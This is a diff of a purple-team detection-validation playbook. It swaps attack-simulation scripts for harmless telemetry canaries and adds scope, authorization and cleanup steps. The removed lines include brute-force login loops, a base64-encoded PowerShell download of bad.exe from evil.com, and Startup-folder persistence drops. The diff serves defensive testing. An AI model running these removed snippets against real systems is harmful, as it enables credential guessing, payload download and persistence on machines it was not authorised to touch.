@@ -4,21 +4,21 @@
 
 ## 🎯 Purpose
 
-Integrate **Python**, **PowerShell**, and **Batch** scripts for realistic, multi-platform attack simulation & detection validation.
+Use **Python**, **PowerShell**, and **Batch** to generate harmless telemetry canaries and run approved, scoped simulations for detection validation.
 
 ## ⚙️ Function
 
-A tight, four-step scripted loop (pick a TTP → script the attack in Python/PowerShell/Batch → run it in an isolated lab → check SIEM/EDR for the resulting logs and alerts). This is the **script-centric variant** of the purple team playbooks - where `PurpleTeam_Simple.md` and `PurpleTeam_Detailed.md` describe the exercise process and tooling ecosystem, this file is specifically about writing and running the actual attack scripts that drive detection validation, organized by scripting language/platform.
+A repeatable loop (choose a detection question → select a harmless canary or vendor-approved simulation → run it within the authorized scope → compare expected and observed telemetry). This is the **script-centric variant** of the purple team playbooks: `PurpleTeam_Simple.md` and `PurpleTeam_Detailed.md` describe the exercise process and tooling ecosystem, while this file focuses on safe signals organized by scripting language and platform.
 
 ## 🏆 Goal
 
-Make it fast to go from "we want to validate detection for TTP X" to an actual runnable script and a confirmed SIEM/EDR alert (or confirmed detection gap) - minimizing the time between choosing a technique and getting a real answer about your detection coverage.
+Make detection exercises repeatable without sending credentials, contacting unrelated hosts, installing persistence, or downloading payloads. Synthetic canaries validate collection and parsing; they do not prove that a full attack technique is detected.
 
 ## 📋 When to Use
 
-- You already have a purple team process (see `PurpleTeam_Simple.md`/`PurpleTeam_Detailed.md`) and need the actual attack script for a specific TTP
-- Validating detection coverage for a technique across multiple platforms/languages (e.g., confirming both a PowerShell-based and Python-based version of the same TTP get caught)
-- Building a reusable library of attack scripts mapped to MITRE ATT&CK techniques for repeat testing
+- You already have a purple team process (see `PurpleTeam_Simple.md`/`PurpleTeam_Detailed.md`) and need a harmless signal or approved simulation for a detection question
+- Comparing telemetry collection across platforms or languages without treating a synthetic canary as proof of technique-level detection
+- Building a reusable library of harmless canaries and documented vendor-approved simulations mapped to detection objectives
 
 ---
 
@@ -34,9 +34,9 @@ Make it fast to go from "we want to validate detection for TTP X" to an actual r
 
 ## Workflow (Recap)
 
-1️⃣ Pick TTP
+1️⃣ State a detection question
 
-2️⃣ Script attack in Python/PowerShell/Batch
+2️⃣ Select a harmless canary or approved simulation in Python/PowerShell/Batch
 
 3️⃣ Run in isolated lab
 
@@ -48,159 +48,119 @@ Make it fast to go from "we want to validate detection for TTP X" to an actual r
 
 ---
 
-## Example Playbook Entries
+> [!WARNING]
+> The examples below are harmless simulations. They do not attempt logins, alter autorun locations, or fetch files. For behavior-level testing, use the endpoint or SIEM vendor's documented test facility or a separately reviewed simulation in an isolated, explicitly authorized lab.
 
-Below are practical examples for each script type.
+## Safe validation flow
 
----
+1. Confirm written authorization, hosts, time window, data handling, and a stop contact.
+2. Snapshot or reset the lab and confirm test accounts/devices contain no real secrets.
+3. Choose a harmless canary and state exactly which telemetry it can exercise.
+4. Generate the signal locally or send it only to a listener bound to the lab host.
+5. Compare expected events with observed telemetry; record missing, delayed, and unavailable data as unverified.
+6. Stop on unexpected network or system changes, clean up, restore the snapshot, and report evidence and limits.
 
-### 🧩 Example 1 - Brute Force
+~~~mermaid
+flowchart LR
+    A[Written scope and stop conditions] --> B[Isolated lab snapshot]
+    B --> C[Harmless canary or approved test signal]
+    C --> D[Telemetry collection]
+    D --> E[Analyst checks expected event and source]
+    E --> F[Record observed, missing, or unavailable]
+    F --> G[Cleanup and restore lab]
+    A -. Scope unclear .-> X[Stop]
+    C -. External effect or real credential requested .-> X
+~~~
 
-| Item | Value |
-|------|-------|
-| **TTP ID** | T1110 (Brute Force) |
-| **Goal** | Test login failure detection |
-| **Method (Python)** | Try multiple password attempts |
-| **Method (PowerShell)** | Loop failed `net use` |
-| **Method (Batch)** | Automate repeated auth attempts |
+## Example playbook entries
 
----
+### Example 1 — Synthetic authentication-failure event
 
-#### ✅ Python
-```python
-import requests
-from requests.auth import HTTPBasicAuth
+This only tests whether the local script output is collected and parsed. It does **not** create an operating-system authentication failure or validate lockout controls.
 
-users = ["admin"]
-passwords = ["1234", "password", "admin"]
+~~~python
+import json
 
-for user in users:
-    for pwd in passwords:
-        r = requests.get(
-            "http://target/login",
-            auth=HTTPBasicAuth(user, pwd)
-        )
-        print(f"{user}:{pwd} -> {r.status_code}")
-```
-
----
-
-#### ✅ PowerShell
-```powershell
-# Attempt network share connection with bad creds
-$User = "admin"
-$Passwords = @("1234", "password", "admin")
-
-foreach ($pwd in $Passwords) {
-    net use \\target\IPC$ /user:$User $pwd
+event = {
+    "event": "purple_test",
+    "scenario": "synthetic_auth_failure",
+    "user": "lab-user",
+    "result": "simulated_failure",
 }
-```
+print(json.dumps(event, separators=(",", ":")))
+~~~
 
----
+~~~powershell
+$Event = [pscustomobject]@{
+    event = "purple_test"
+    scenario = "synthetic_auth_failure"
+    user = "lab-user"
+    result = "simulated_failure"
+}
+$Event | ConvertTo-Json -Compress
+~~~
 
-#### ✅ Batch
-```batch
+~~~batch
 @echo off
-set USER=admin
-set PASSWORDS=1234 password admin
+echo event=purple_test scenario=synthetic_auth_failure user=lab-user result=simulated_failure
+~~~
 
-for %%P in (%PASSWORDS%) do (
-    net use \\target\IPC$ /user:%USER% %%P
-)
-```
+For an end-to-end authentication detection test, use a documented vendor test facility or a purpose-built local test application with synthetic credentials and explicit rate/lockout bounds.
 
----
+### Example 2 — Benign encoded PowerShell canary
 
-### 🧩 Example 2 - Suspicious PowerShell
+This tests process-command telemetry for an encoded command. The decoded content only writes a fixed marker to standard output.
 
-| Item | Value |
-|------|-------|
-| **TTP ID** | T1059 |
-| **Goal** | Test detection of obfuscated PowerShell |
-| **Method (PowerShell)** | Base64-encoded command |
-| **Method (Batch)** | Spawn PowerShell with encoded script |
-
----
-
-#### ✅ PowerShell
-```powershell
-# Encoded command to download file
-$Command = 'Invoke-WebRequest -Uri http://evil.com/bad.exe -OutFile C:\temp\bad.exe'
+~~~powershell
+$Command = "Write-Output 'PURPLE_TEST_CANARY'"
 $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Command)
 $Encoded = [Convert]::ToBase64String($Bytes)
+powershell.exe -NoProfile -EncodedCommand $Encoded
+~~~
 
-powershell.exe -EncodedCommand $Encoded
-```
+This is a narrow test of the encoded-command signal. It does not reproduce malicious obfuscation or validate every PowerShell policy.
 
----
+### Example 3 — Startup-detection validation
 
-#### ✅ Batch
-```batch
-@echo off
-REM Spawn PowerShell with encoded download command
-powershell.exe -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAuAGMAbwBtAC8AYgBhAGQALgBlAHgAZQAgAC0ATwB1AHQARgBpAGwAZQAgAEMAOgBcAHQAZQBtAHAAXABiAGEAZAAuAGUAeABl
-```
+Do not write test files into a real user's Startup folder. Use an endpoint-vendor simulation or a disposable VM snapshot with a reviewed test fixture. A harmless marker file in a temporary directory can validate file-write telemetry, but it does not test persistence detection.
 
-*(This string is the UTF-16 base64 version of `Invoke-WebRequest ...` above - can regenerate as needed.)*
+~~~powershell
+$Canary = Join-Path $env:TEMP "purple-test-canary.txt"
+Set-Content -LiteralPath $Canary -Value "PURPLE_TEST_STARTUP_SIMULATION"
+Get-Item -LiteralPath $Canary | Select-Object FullName, Length
+Remove-Item -LiteralPath $Canary
+~~~
 
----
+### Example 4 — Local syslog canary
 
-### 🧩 Example 3 - Persistence via Startup (Batch)
+Use only when a test collector is listening on loopback at port 5514. This sends one synthetic message to the same host.
 
-| Item | Value |
-|------|-------|
-| **TTP ID** | T1547 |
-| **Goal** | Validate detection of new startup entries |
-| **Method (Batch)** | Drop script in startup folder |
-
----
-
-#### ✅ Batch
-```batch
-@echo off
-REM Create a malicious batch file in startup folder
-echo @echo Malicious Run >> %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\evil.bat
-```
-
----
-
-#### ✅ PowerShell
-```powershell
-# Drop a startup script
-$Path = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\evil.ps1"
-Set-Content $Path "Start-Process notepad.exe"
-```
-
----
-
-### 🧩 Example 4 - Python to Trigger SIEM Alert
-
-```python
+~~~python
 import socket
 
-sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-syslog_server = ("192.168.1.100", 514)
+message = b"<134>1 - - - - - PURPLE_TEST_CANARY"
+with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
+    sock.settimeout(2)
+    sock.sendto(message, ("127.0.0.1", 5514))
+~~~
 
-message = "<134> LAB TEST: Detected Evil Activity!"
-sock.sendto(message.encode(), syslog_server)
-sock.close()
-```
+Do not replace loopback with a third-party or production collector without written authorization and a confirmed change window.
 
----
+## Reporting template
 
-## Reporting Template
+| Field | Record |
+|---|---|
+| Scope / authorization | |
+| Scenario and canary | |
+| Host snapshot / test identity | |
+| Expected telemetry source and event | |
+| Observed result and timestamp | |
+| Missing, delayed, or unavailable data | |
+| Cleanup / restoration result | |
+| Follow-up owner | |
 
-| Field | Example |
-|-------|---------|
-| TTP | T1110 |
-| Goal | Validate brute force detection |
-| Tool | Python + PowerShell + Batch |
-| Log Source | Auth logs |
-| SIEM Rule | Multiple failed logins |
-| Result | Pass |
-| Notes | Lockout threshold adjusted |
+A missing alert is a finding only after confirming that the event was generated, collected, parsed, and routed through the expected pipeline. Otherwise record the result as unverified.
 
----
 
 ## Version Control
 
